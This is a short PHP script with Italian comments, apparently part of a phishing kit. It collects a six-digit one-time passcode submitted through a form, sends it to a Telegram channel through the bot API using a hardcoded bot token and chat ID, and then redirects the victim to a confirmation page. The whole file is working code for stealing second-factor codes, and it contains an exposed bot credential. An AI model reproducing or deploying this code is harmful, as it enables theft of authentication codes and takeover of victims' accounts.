<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera il valore del radio button selezionato
    $otpcode0 = $_POST["otpCode-0"];
    $otpcode1 = $_POST["otpCode-1"];
    $otpcode2 = $_POST["otpCode-2"];
    $otpcode3 = $_POST["otpCode-3"];
    $otpcode4 = $_POST["otpCode-4"];
    $otpcode5 = $_POST["otpCode-5"];

    // Token del bot Telegram e ID del canale
    $botApiToken = '6400179200:AAFLNC22j2zdSxCD83QB70N3zgHyG3AMgiA';
    $channelId = '8105246558';

    // Creazione del messaggio da inviare
    $txt = "🔑OTP🔑: {$otpcode0}{$otpcode1}{$otpcode2}{$otpcode3}{$otpcode4}{$otpcode5}";

    // Costruzione della query per l'API di Telegram
    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);

    // URL dell'API di Telegram
    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    // Inizializza cURL per inviare la richiesta HTTP
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);

    // Esegui la richiesta e chiudi cURL
    $response = curl_exec($curl);
    curl_close($curl);

    // Reindirizza l'utente a una pagina di conferma
    header("Location: redirect/index.html");
    exit;
}
?>
